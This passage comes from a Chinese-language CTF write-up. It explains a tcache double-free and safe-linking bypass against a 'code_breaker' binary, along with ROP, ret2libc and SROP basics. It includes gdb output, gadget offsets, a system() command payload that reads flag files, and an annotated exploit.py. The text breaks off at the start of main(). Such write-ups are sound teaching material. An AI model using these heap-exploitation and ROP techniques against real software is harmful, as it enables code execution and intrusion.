  \AttributeTok{{-}ex} \StringTok{\textquotesingle{}printf "P=\%p  P{-}0x10=\%p  P\textgreater{}\textgreater{}12=\%\#lx\textbackslash{}n", P, (char*)P{-}0x10, (unsigned long)P\textgreater{}\textgreater{}12\textquotesingle{}} \DataTypeTok{\textbackslash{}}
  \AttributeTok{{-}ex} \StringTok{\textquotesingle{}x/2gx P\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}continue\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}x/2gx P\textquotesingle{}}\NormalTok{ /tmp/tr2\_p}
\end{Highlighting}
\end{Shaded}

實測輸出：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
Breakpoint 1, main () at /tmp/tr2.c:8
P=0x55555555b2a0  P-0x10=0x55555555b290  P>>12=0x55555555b
0x55555555b2a0: 0x000000055555555b   0x8885eebd61c58fb7
                └ next ──────────┘   └ key ─────────────┘
Breakpoint 2, main () at /tmp/tr2.c:11
0x55555555b2a0: 0x000055500000e7fb   0x8885eebd61c58fb7
\end{Verbatim}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
狀態
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
\texttt{next} 欄位（P 的前 8 bytes）
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
意義
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
(a) free \#1 之後（鏈是空的） & \texttt{0x55555555b} &
\textbf{\texttt{next\ \allowbreak{}==\ \allowbreak{}P\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}} ★ 這就是
leak 出來的 safe-linking key \\
(b) 清 key + 再 free 一次之後 & \texttt{0x55500000e7fb} &
\textbf{\texttt{next\ \allowbreak{}==\ \allowbreak{}P\ \allowbreak{}\^\allowbreak{}{}\allowbreak{}\ \allowbreak{}(P\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12)}}
★ 自我參照環 P → P \\
\end{longtable}
}

驗算：\texttt{0x55555555b2a0\ \allowbreak{}\^\allowbreak{}{}\allowbreak{}\ \allowbreak{}0x55555555b\ \allowbreak{}=\ \allowbreak{}0x55500000e7fb}
✓（\texttt{key} 欄位是隨機的 \texttt{tcache\_\allowbreak{}key}，每次執行都不一樣，gdb
裡預設關掉 ASLR 所以 \texttt{P} 每次相同）。

兩件事因此被證實：\textbf{空鏈時
\texttt{next\ \allowbreak{}==\ \allowbreak{}P\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12}}、\textbf{double free
後 \texttt{next\ \allowbreak{}==\ \allowbreak{}P\ \allowbreak{}\^\allowbreak{}{}\allowbreak{}\ \allowbreak{}(P\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12)}}。
（附帶一提，這次 \texttt{(P-\allowbreak{}0x10)\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12}
算出來也是 \texttt{0x55555555b} ------ 正是上面警告
「拿標頭去算看起來也會動」的原因；但請照定義用 \texttt{P}。）

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{5. 從零開始學
ROP（與為什麼本題其實不需要它）}\label{ux5f9eux96f6ux958bux59cbux5b78-ropux8207ux70baux4ec0ux9ebcux672cux984cux5176ux5be6ux4e0dux9700ux8981ux5b83}

\paragraph{5.1 什麼是 gadget}\label{ux4ec0ux9ebcux662f-gadget}

程式裡到處都是 \texttt{ret}（\texttt{c3}）。\textbf{gadget = 以
\texttt{ret} 結尾的一小段指令}。 攻擊者只要控制 stack
上的內容，就可以用「一次 \texttt{ret} 跳一段」的方式把許多小片段串起來，
這就是 \textbf{Return-Oriented Programming（ROP）}。

最經典、最常用的 gadget 是：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
pop rdi ; ret      ; 從 stack 取出 8 bytes 放到 rdi，然後 ret
\end{Verbatim}

為什麼有用？因為 \textbf{\texttt{rdi} 是函式的第一個參數}。想呼叫
\texttt{system("/\allowbreak{}bin/\allowbreak{}sh")} 就需要 \texttt{rdi\ \allowbreak{}=\ \allowbreak{}\&\allowbreak{}"/\allowbreak{}bin/\allowbreak{}sh"}，而
\texttt{pop\ \allowbreak{}rdi\ \allowbreak{};\ \allowbreak{}ret} 正好可以從我們控制的 stack 上「彈」一個值進
\texttt{rdi}。

本題的 gadget（實測 \texttt{ROPgadget}）：

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{$}\NormalTok{ ROPgadget }\AttributeTok{{-}{-}binary}\NormalTok{ code\_breaker }\KeywordTok{|} \FunctionTok{grep} \StringTok{\textquotesingle{}: pop rdi ; ret$\textquotesingle{}}
\ExtensionTok{0x0000000000001e3f}\NormalTok{ : pop rdi }\KeywordTok{;} \ExtensionTok{ret}
\ExtensionTok{$}\NormalTok{ ROPgadget }\AttributeTok{{-}{-}binary}\NormalTok{ code\_breaker }\KeywordTok{|} \FunctionTok{grep} \StringTok{\textquotesingle{}: ret$\textquotesingle{}}
\ExtensionTok{0x000000000000101a}\NormalTok{ : ret}
\ExtensionTok{$}\NormalTok{ ROPgadget }\AttributeTok{{-}{-}binary}\NormalTok{ libc.so.6 }\KeywordTok{|} \FunctionTok{grep} \StringTok{\textquotesingle{}: pop rdi ; ret$\textquotesingle{}}
\ExtensionTok{0x000000000010f75b}\NormalTok{ : pop rdi }\KeywordTok{;} \ExtensionTok{ret}
\ExtensionTok{$}\NormalTok{ ROPgadget }\AttributeTok{{-}{-}binary}\NormalTok{ libc.so.6 }\KeywordTok{|} \FunctionTok{grep} \StringTok{\textquotesingle{}: ret$\textquotesingle{}}
\ExtensionTok{0x000000000002882f}\NormalTok{ : ret}
\end{Highlighting}
\end{Shaded}

用 pwntools 也可以：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{elf }\OperatorTok{=}\NormalTok{ ELF(}\StringTok{\textquotesingle{}./code\_breaker\textquotesingle{}}\NormalTok{, checksec}\OperatorTok{=}\VariableTok{False}\NormalTok{)}
\NormalTok{rop }\OperatorTok{=}\NormalTok{ ROP(elf)}
\NormalTok{rop.rdi                      }\CommentTok{\# 自動找 pop rdi; ret}
\NormalTok{rop.call(}\StringTok{\textquotesingle{}system\textquotesingle{}}\NormalTok{, [binsh])  }\CommentTok{\# 自動組出呼叫}
\BuiltInTok{print}\NormalTok{(rop.dump())}
\end{Highlighting}
\end{Shaded}

\paragraph{5.2 ret2libc 的公式}\label{ret2libc-ux7684ux516cux5f0f}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
system 位址 = libc_base + libc.symbols['system']        # 本題 libc: 0x58740
"/bin/sh" 位址 = libc_base + 0x1cb42f                   # ROPgadget --string '/bin/sh'
libc_base  = 洩漏到的某個 libc 函式位址 - 該函式的 offset
PIE base   = 洩漏到的程式位址 - 該位址的檔案內 offset
\end{Verbatim}

本題的真實數值（已驗證）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
[0x40c0] 內容 = PIE_base + 0x1390        ⇒ PIE_base  = leaked - 0x1390
system@plt    = PIE_base + 0x1150
目標函式指標   = PIE_base + 0x40c0
\end{Verbatim}

\paragraph{5.3 對應到本題}\label{ux5c0dux61c9ux5230ux672cux984c}

本題的 \texttt{cmd\ \allowbreak{}0x15} 直接做了「ROP chain 想達成的事」：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
1a35: mov rdi,rax             ; rdi = 我們送的字串（第一參數）
1a38: call QWORD PTR [0x40c0] ; 呼叫 [0x40c0]
\end{Verbatim}

所以只要 \texttt{{[}0x40c0{]}\ \allowbreak{}=\ \allowbreak{}system@plt}，就等於是
\texttt{system(我們的字串)} ------\textbf{不用自己排 ROP chain，也不用管
stack 對齊}（因為那是編譯器產生的正常 \texttt{call}）。
這就是「\textbf{函式指標覆寫}」比 ROP 更省事的情況。

（如果沒有這個間接呼叫，就得走：洩漏 canary → 覆蓋 return address → ROP
chain： \texttt{ret;\ \allowbreak{}pop\ \allowbreak{}rdi;\ \allowbreak{}ret;\ \allowbreak{}\&\allowbreak{}"/\allowbreak{}bin/\allowbreak{}sh";\ \allowbreak{}system}。）

\paragraph{\texorpdfstring{5.4 16-byte 對齊與 \texttt{movaps}
崩潰}{5.4 16-byte 對齊與 movaps 崩潰}}\label{byte-ux5c0dux9f4aux8207-movaps-ux5d29ux6f70}

System V ABI 要求：\textbf{執行 \texttt{call} 時 \texttt{rsp} 必須是 16
的倍數}。有些 libc 函式（例如 \texttt{system} 內部會用到 SSE 的
\texttt{movaps}）如果 \texttt{rsp} 沒對齊，會直接丟 \texttt{SIGSEGV}
（錯誤訊息通常長得像
\texttt{movaps\ \allowbreak{}xmmword\ \allowbreak{}ptr\ \allowbreak{}{[}rsp+0x40{]},\allowbreak{}\ \allowbreak{}xmm0}）。

用 ROP 時我們是自己排 stack，很容易差 8 bytes，所以慣用手法是\textbf{在
chain 前面多塞一個 \texttt{ret}（單獨的 \texttt{ret} gadget）}，等於多
pop 一次、把 \texttt{rsp} 推移 8 bytes 修正對齊。

本題不需要（正常 \texttt{call}
進去，對齊由編譯器保證），但這是必踩的坑。

\paragraph{5.5 SROP
是什麼（補充）}\label{srop-ux662fux4ec0ux9ebcux88dcux5145}

\textbf{SROP = Sigreturn-Oriented Programming}。原理：Linux 的 signal
handler 返回時會執行 \texttt{rt\_\allowbreak{}sigreturn}（syscall
\texttt{rax\ \allowbreak{}=\ \allowbreak{}15}），核心會從 stack 上讀一個 \textbf{sigcontext
結構}並把 \textbf{所有暫存器}都還原。於是只要：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
1. 控制 rax = 15
2. 執行 syscall
3. stack 上排好假的 sigcontext（可以指定 rax=59, rdi=&"/bin/sh", rip=syscall, ...）
\end{Verbatim}

就能用極少的 gadget 做「任意 syscall」（例如
\texttt{execve("/\allowbreak{}bin/\allowbreak{}sh",\allowbreak{}0,\allowbreak{}0)}）。 常用工具是 pwntools 的
\texttt{SigreturnFrame()}：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{frame }\OperatorTok{=}\NormalTok{ SigreturnFrame()}
\NormalTok{frame.rax }\OperatorTok{=} \DecValTok{59}          \CommentTok{\# execve}
\NormalTok{frame.rdi }\OperatorTok{=}\NormalTok{ binsh}
\NormalTok{frame.rsi }\OperatorTok{=} \DecValTok{0}
\NormalTok{frame.rdx }\OperatorTok{=} \DecValTok{0}
\NormalTok{frame.rip }\OperatorTok{=}\NormalTok{ syscall\_ret}
\NormalTok{payload }\OperatorTok{=}\NormalTok{ flat([syscall\_gadget, frame])}
\end{Highlighting}
\end{Shaded}

本題不需要 SROP（有現成的 \texttt{system@plt}），但當程式\textbf{沒有}
\texttt{system}／\texttt{pop\ \allowbreak{}rdi} 等 好用 gadget 時，SROP
往往是唯一出路。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{6. ASCII
圖：記憶體佈局}\label{ascii-ux5716ux8a18ux61b6ux9ad4ux4f48ux5c40}

\paragraph{\texorpdfstring{6.1 \texttt{0x1900}（指令主迴圈）的 stack
frame}{6.1 0x1900（指令主迴圈）的 stack frame}}\label{x1900ux6307ux4ee4ux4e3bux8ff4ux5708ux7684-stack-frame}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
        低位址
        ┌────────────────────────────────────────────────┐
 rsp+0x00│ [rsp+0x08] = &len （區域變數）                │
         │ [rsp+0x10] / [rsp+0x18] = cmd 0x15 暫存 src/n │
 rsp+0x2c│ u16 len（0x13f0 寫進來；上限 0x1000）         │
 rsp+0x30├───────────────────────────────────────────────┤
         │ msg[0x1000]  ← 收到的（已解密的）訊息         │
         │   0x30 = cmd, 0x31.. = 參數                   │
 rsp+0x1030├─────────────────────────────────────────────┤
         │ cmd 0x15 的 null-terminated 字串緩衝 (0x1000) │
         │   __memcpy_chk 的 dest 就是這裡               │
 rsp+0x2030├─────────────────────────────────────────────┤
         │ 回應緩衝區（cmd 0x11/0x15/0x16 用）0x1008 大  │
 rsp+0x3038├─────────────────────────────────────────────┤
         │ **canary**（fs:0x28）                         │
 rsp+0x3040├─────────────────────────────────────────────┤
         │ (padding)                                     │
 rsp+0x3048├─────────────────────────────────────────────┤
         │ saved rbx  (0x3048) → rbp(0x3050) →r12(0x3058)│
         │ → r13(0x3060) → r14(0x3068) → r15(0x3070)     │
 rsp+0x3078├─────────────────────────────────────────────┤
         │ return address → main 的 0x124a               │
         └───────────────────────────────────────────────┘
        高位址
\end{Verbatim}

\paragraph{\texorpdfstring{6.2 全域變數（\texttt{.\allowbreak{}bss} /
\texttt{.\allowbreak{}data}）}{6.2 全域變數（.bss / .data）}}\label{ux5168ux57dfux8b8aux6578.bss-.data}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
 0x40c0 ┌──────────────────────────────┐
        │ void (*handler)(char *)  ← ✶ │  預設 = PIE+0x1390（endbr64; ret）
 0x40c8 ├──────────────────────────────┤
        │ "CodeBreaker\0\0\0\0"        │
 0x40d8 │ 0 ...                        │
 0x4108 │ "2.1.4"                      │
 0x4128 │ 0x30                         │
 0x4130 │ 0 ...（cmd 0x16 會一起 dump）│
 0x41c0 ├──────────────────────────────┤
        │ slot[0]  ptr/size/refcount   │  16 個 slot × 16 bytes
        │ slot[1]  ...                 │
        │ ...                          │
 0x42c0 ├──────────────────────────────┤
        │ u32 收方計數器 (0x42c0)      │
 0x42c4 │ u32 送方計數器 (0x42c4)      │
 0x42d0 │ K[16]（金鑰表）              │
        └──────────────────────────────┘
\end{Verbatim}

\paragraph{6.3 Heap 攻擊佈局}\label{heap-ux653bux64caux4f48ux5c40}

\begin{quote}
圖裡的 \texttt{P} ＝ \textbf{\texttt{cb.\allowbreak{}alloc()} 之後 \texttt{malloc}
回傳的那個 user 位址}； chunk 標頭在 \texttt{P\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x10}（見 §3.5
(1)）。
\end{quote}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
攻擊前：                           攻擊後：
  heap                               heap
  ┌──────────────┐                   ┌──────────────┐
  │ ...          │                   │ ...          │
  ├──────────────┤ ← P - 0x10        ├──────────────┤ ← P - 0x10
  │ size = 0x91  │   chunk 標頭      │ size = 0x91  │   chunk 標頭
  ├──────────────┤ ← P               ├──────────────┤ ← P ✶ malloc 回傳值
  │  'A' * 0x80  │   slot0.ptr                      │ next = TARGET ^ (P>>12)  ← 假造！
  │              │   slot1.ptr                      │ key  = 0                 ← 清掉，繞過 double free 檢查
  └──────────────┘                   └──────────────┘
   tcache[0x90] head = P              tcache[0x90] head = P → TARGET(=PIE+0x40c0)
\end{Verbatim}

\textbf{\texttt{P} 的三態（就是 §4 的三步；gdb 實測見 §4.3）：}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
 (a) free #1：P 進「空的」tcache[0x90]
     entries[7] ──► [P]        P->next = (P>>12) ^ NULL = P >> 12   ← key 洩漏處

 (b) UAF 寫清 next/key + free #2（double free）
     entries[7] ──► [P] ──next──► [P]      P->next = P ^ (P>>12)     ← 環！可還原出 P

 (c) 把 P->next 改成 (P>>12) ^ (PIE+0x40c0)
     entries[7] ──► [P] ──next──► 0x…40c0
                     ▲                 ▲
        malloc #1 回傳 ┘                 └─ malloc #2 回傳「.bss 的函式指標那一格」
\end{Verbatim}

接著：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
malloc(0x80) → 回傳 P        （tcache 取出 P，head 變成 TARGET）
malloc(0x80) → 回傳 TARGET！ （= PIE+0x40c0，.bss 裡的函式指標位址）
之後 cmd 0x10 的 memcpy 就會把 system@plt 寫進 0x40c0
\end{Verbatim}

\texttt{TARGET} 必須 \textbf{16-byte 對齊}（glibc 有
\texttt{aligned\_\allowbreak{}OK(e)} 檢查，本題 PIE base 是
page-aligned，\texttt{+0x40c0} 一定是 16 對齊）。
再強調一次：\texttt{TARGET} ＝ \textbf{「存放函式指標那一格的位址」}（=
那塊假 chunk 的 user 起點）， \textbf{不是} \texttt{PIE+0x40d0}；填成
\texttt{+0x40d0} 的話 \texttt{{[}0x40c0{]}} 根本不會被改到。

\subparagraph{\texorpdfstring{為什麼
\texttt{CHUNK\ \allowbreak{}=\ \allowbreak{}0x80}？}{為什麼 CHUNK = 0x80？}}\label{ux70baux4ec0ux9ebc-chunk-0x80}

\texttt{cmd\ \allowbreak{}0x10} 只限制
\texttt{1\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}size\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}0x400}，所以 size
其實可以自己挑。選 \texttt{0x80} 的理由：

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  chunk 變 \texttt{0x90} → tcache idx
  7，而\textbf{這條鏈在本題流程裡一定是空的}（乾淨可控）；
\item
  要寫進 \texttt{0x40c0} 的內容需要 \texttt{0x80} bytes 的
  \texttt{\_\allowbreak{}\_\allowbreak{}memcpy\_\allowbreak{}chk} 目的地大小 （\texttt{destlen\ \allowbreak{}=\ \allowbreak{}size}），用
  \texttt{p64(system@plt)} + 補 0 剛剛好。 換成別的 size（例如
  \texttt{0x20}）一樣能打，只要對應的 tcache size class 是空的、 而且
  payload 塞得下 \texttt{system@plt} 就好。
\end{enumerate}

\paragraph{6.4 最終 payload（cmd 0x15
的內容）}\label{ux6700ux7d42-payloadcmd-0x15-ux7684ux5167ux5bb9}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
      ┌───────┬───────┬──────────────────────────────────────────────────────┐
      │ 00 47 │ 0x15  │ "cat flag.txt /flag /home/*/flag.txt 2>/dev/null;    │
      │       │       │  ls -la; id; echo DONE"                              │
      └───────┴───────┴──────────────────────────────────────────────────────┘
       len=0x47  cmd                   指令本體 70 bytes
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  這是 \texttt{exploit.\allowbreak{}py}
  真正送出的那一封：\texttt{cb.\allowbreak{}cmd(b\textquotesingle{}\allowbreak{}\textbackslash{}\allowbreak{}x15\textquotesingle{}\allowbreak{}\ \allowbreak{}+\ \allowbreak{}shell\_\allowbreak{}cmd)}。
\item
  最前面的 2 bytes 是 \textbf{big-endian
  長度前綴}，算的是「長度前綴\textbf{之後}的全部 bytes」 （含 cmd 那 1
  byte）：\texttt{70\ \allowbreak{}+\ \allowbreak{}1\ \allowbreak{}=\ \allowbreak{}71\ \allowbreak{}=\ \allowbreak{}0x47} ⇒ 前綴是 \texttt{00\ \allowbreak{}47}。
  （如果只想示範最小案例
  \texttt{b\textquotesingle{}\allowbreak{}\textbackslash{}\allowbreak{}x15\textquotesingle{}\allowbreak{}\ \allowbreak{}+\ \allowbreak{}b\textquotesingle{}\allowbreak{}/\allowbreak{}bin/\allowbreak{}sh\textbackslash{}\allowbreak{}0\textquotesingle{}\allowbreak{}}，長度會是
  \texttt{2\ \allowbreak{}+\ \allowbreak{}1\ \allowbreak{}+\ \allowbreak{}8\ \allowbreak{}=\ \allowbreak{}11\ \allowbreak{}=\ \allowbreak{}0x0b}， 但本題不建議這樣做，見 §9 坑
  12。）
\item
  \texttt{0x15} 之後的整段字串會被 \texttt{\_\allowbreak{}\_\allowbreak{}memcpy\_\allowbreak{}chk} 複製到
  \texttt{rsp+0x1030} 並補上
  \texttt{\textquotesingle{}\allowbreak{}\textbackslash{}\allowbreak{}0\textquotesingle{}\allowbreak{}}，
  再當成 \texttt{rdi} 傳給 \texttt{{[}0x40c0{]}}（此時已經是
  \texttt{system@plt}）⇒ \texttt{system(整條指令)}。
\end{itemize}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{\texorpdfstring{7. \texttt{exploit.\allowbreak{}py}
逐行註解}{7. exploit.py 逐行註解}}\label{exploit.py-ux9010ux884cux8a3bux89e3-2}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{OFF\_FUNC\_PTR }\OperatorTok{=} \BaseNTok{0x40c0}      \CommentTok{\# 被 cmd 0x15 呼叫的函式指標（我們的攻擊目標）}
\NormalTok{OFF\_STUB     }\OperatorTok{=} \BaseNTok{0x1390}      \CommentTok{\# endbr64; ret：main 一開始塞進 [0x40c0] 的值 ⇒ 可用來算 PIE base}
\NormalTok{OFF\_SYSTEM   }\OperatorTok{=} \BaseNTok{0x1150}      \CommentTok{\# system@plt}
\NormalTok{SBOX\_OFF     }\OperatorTok{=} \BaseNTok{0x2040}      \CommentTok{\# 檔案內 0x2040 就是 .rodata 的 256{-}byte S{-}box}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ p16be(n): }\ControlFlowTok{return}\NormalTok{ struct.pack(}\StringTok{\textquotesingle{}\textgreater{}H\textquotesingle{}}\NormalTok{, n)   }\CommentTok{\# 協定長度/大小都是 big{-}endian}
\NormalTok{S }\OperatorTok{=}\NormalTok{ load\_sbox()                             }\CommentTok{\# 直接從檔案讀 S{-}box}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ CodeBreaker:}
    \KeywordTok{def}\NormalTok{ raw\_send(}\VariableTok{self}\NormalTok{, payload):            }\CommentTok{\# 明文送出：2{-}byte 長度 + 資料}
        \VariableTok{self}\NormalTok{.io.send(p16be(}\BuiltInTok{len}\NormalTok{(payload)) }\OperatorTok{+}\NormalTok{ payload)}
    \KeywordTok{def}\NormalTok{ raw\_recv(}\VariableTok{self}\NormalTok{):                     }\CommentTok{\# 明文接收}
\NormalTok{        n }\OperatorTok{=}\NormalTok{ struct.unpack(}\StringTok{\textquotesingle{}\textgreater{}H\textquotesingle{}}\NormalTok{, }\VariableTok{self}\NormalTok{.io.recvn(}\DecValTok{2}\NormalTok{))[}\DecValTok{0}\NormalTok{]}
        \ControlFlowTok{return} \VariableTok{self}\NormalTok{.io.recvn(n) }\ControlFlowTok{if}\NormalTok{ n }\ControlFlowTok{else} \StringTok{b\textquotesingle{}\textquotesingle{}}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
    \KeywordTok{def}\NormalTok{ ks(}\VariableTok{self}\NormalTok{, C, n):}
        \CommentTok{\# keystream(C,i) = S[(C + i + K[i \& 0xf]) \& 0xff]}
        \CommentTok{\#   C = 這封訊息開始時的絕對 offset（計數器）}
        \CommentTok{\#   i = 訊息內的索引（注意 K 的索引是 i\&0xf，不是 (C+i)\&0xf！）}
        \ControlFlowTok{return} \BuiltInTok{bytes}\NormalTok{(S[(C }\OperatorTok{+}\NormalTok{ i }\OperatorTok{+} \VariableTok{self}\NormalTok{.K[i }\OperatorTok{\&} \BaseNTok{0xf}\NormalTok{]) }\OperatorTok{\&} \BaseNTok{0xff}\NormalTok{] }\ControlFlowTok{for}\NormalTok{ i }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(n))}
    \KeywordTok{def}\NormalTok{ xor\_stream(}\VariableTok{self}\NormalTok{, data, C):}
        \ControlFlowTok{return}\NormalTok{ xor(data, }\VariableTok{self}\NormalTok{.ks(C, }\BuiltInTok{len}\NormalTok{(data)))   }\CommentTok{\# 加解密同一個函式}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
    \KeywordTok{def}\NormalTok{ handshake(}\VariableTok{self}\NormalTok{):}
\NormalTok{        msg }\OperatorTok{=} \VariableTok{self}\NormalTok{.raw\_recv()               }\CommentTok{\# 1) 收 01 || Ns（明文）}
\NormalTok{        Ns }\OperatorTok{=}\NormalTok{ msg[}\DecValTok{1}\NormalTok{:}\DecValTok{17}\NormalTok{]}
\NormalTok{        Nc }\OperatorTok{=}\NormalTok{ os.urandom(}\DecValTok{16}\NormalTok{)}
        \VariableTok{self}\NormalTok{.raw\_send(}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x02}\StringTok{\textquotesingle{}} \OperatorTok{+}\NormalTok{ Nc)         }\CommentTok{\# 2) 送 02 || Nc（明文）}
        \VariableTok{self}\NormalTok{.K }\OperatorTok{=} \VariableTok{self}\NormalTok{.derive\_key(Ns, Nc)    }\CommentTok{\# 3) 用兩個 nonce 算出 16{-}byte 金鑰表}
\NormalTok{        mac }\OperatorTok{=} \BuiltInTok{bytes}\NormalTok{(S[}\VariableTok{self}\NormalTok{.K[i]] }\OperatorTok{\^{}} \VariableTok{self}\NormalTok{.K[(i }\OperatorTok{+} \DecValTok{5}\NormalTok{) }\OperatorTok{\&} \BaseNTok{0xf}\NormalTok{] }\ControlFlowTok{for}\NormalTok{ i }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{16}\NormalTok{))}
        \VariableTok{self}\NormalTok{.raw\_send(}\VariableTok{self}\NormalTok{.xor\_stream(}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x03}\StringTok{\textquotesingle{}} \OperatorTok{+}\NormalTok{ mac, }\DecValTok{0}\NormalTok{))   }\CommentTok{\# 4) 送 03 || MAC（counter=0 加密）}
        \VariableTok{self}\NormalTok{.rx }\OperatorTok{=} \DecValTok{17}                        \CommentTok{\# 之後「送」的 stream offset = 17}
\NormalTok{        resp }\OperatorTok{=} \VariableTok{self}\NormalTok{.xor\_stream(}\VariableTok{self}\NormalTok{.raw\_recv(), }\DecValTok{0}\NormalTok{)         }\CommentTok{\# 5) 收 04 00（counter=0）}
        \VariableTok{self}\NormalTok{.tx }\OperatorTok{=} \DecValTok{2}                         \CommentTok{\# 之後「收」的 stream offset = 2}
        \ControlFlowTok{assert}\NormalTok{ resp[}\DecValTok{1}\NormalTok{] }\OperatorTok{==} \BaseNTok{0x00}\NormalTok{, }\StringTok{\textquotesingle{}handshake rejected: }\SpecialCharTok{\%r}\StringTok{\textquotesingle{}} \OperatorTok{\%}\NormalTok{ resp}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
    \KeywordTok{def}\NormalTok{ cmd(}\VariableTok{self}\NormalTok{, payload):                 }\CommentTok{\# 送一個指令（自動用 rx 當 stream offset）}
        \VariableTok{self}\NormalTok{.raw\_send(}\VariableTok{self}\NormalTok{.xor\_stream(payload, }\VariableTok{self}\NormalTok{.rx))}\OperatorTok{;} \VariableTok{self}\NormalTok{.rx }\OperatorTok{+=} \BuiltInTok{len}\NormalTok{(payload)}
    \KeywordTok{def}\NormalTok{ resp(}\VariableTok{self}\NormalTok{):                         }\CommentTok{\# 收一個回應（自動用 tx）}
\NormalTok{        raw }\OperatorTok{=} \VariableTok{self}\NormalTok{.raw\_recv()}\OperatorTok{;}\NormalTok{ out }\OperatorTok{=} \VariableTok{self}\NormalTok{.xor\_stream(raw, }\VariableTok{self}\NormalTok{.tx)}\OperatorTok{;} \VariableTok{self}\NormalTok{.tx }\OperatorTok{+=} \BuiltInTok{len}\NormalTok{(raw)}
        \ControlFlowTok{return}\NormalTok{ out}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
    \KeywordTok{def}\NormalTok{ alloc(}\VariableTok{self}\NormalTok{, idx, size, data):       }\CommentTok{\# 指令 0x10：malloc 並存進 slot[idx]}
\NormalTok{        r }\OperatorTok{=} \VariableTok{self}\NormalTok{.req(}\BuiltInTok{bytes}\NormalTok{([}\BaseNTok{0x10}\NormalTok{, idx]) }\OperatorTok{+}\NormalTok{ p16be(size) }\OperatorTok{+}\NormalTok{ data)}
        \ControlFlowTok{assert}\NormalTok{ r[}\DecValTok{1}\NormalTok{] }\OperatorTok{==} \DecValTok{0}                    \CommentTok{\# 回應 [0x10][00] = 成功}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
    \KeywordTok{def}\NormalTok{ read(}\VariableTok{self}\NormalTok{, idx):                    }\CommentTok{\# 指令 0x11：回傳 slot 內容}
        \CommentTok{\# 回應格式是 [0x11][0x00][size\_be16][data...]（4{-}byte 標頭！）}
\NormalTok{        r }\OperatorTok{=} \VariableTok{self}\NormalTok{.req(}\BuiltInTok{bytes}\NormalTok{([}\BaseNTok{0x11}\NormalTok{, idx]))}
\NormalTok{        size }\OperatorTok{=}\NormalTok{ struct.unpack(}\StringTok{\textquotesingle{}\textgreater{}H\textquotesingle{}}\NormalTok{, r[}\DecValTok{2}\NormalTok{:}\DecValTok{4}\NormalTok{])[}\DecValTok{0}\NormalTok{]}
        \ControlFlowTok{return}\NormalTok{ r[}\DecValTok{4}\NormalTok{:}\DecValTok{4} \OperatorTok{+}\NormalTok{ size]}
\end{Highlighting}
\end{Shaded}

主流程（\texttt{main()}）：

\begin{Shaded}
\begin{Highlighting}[]
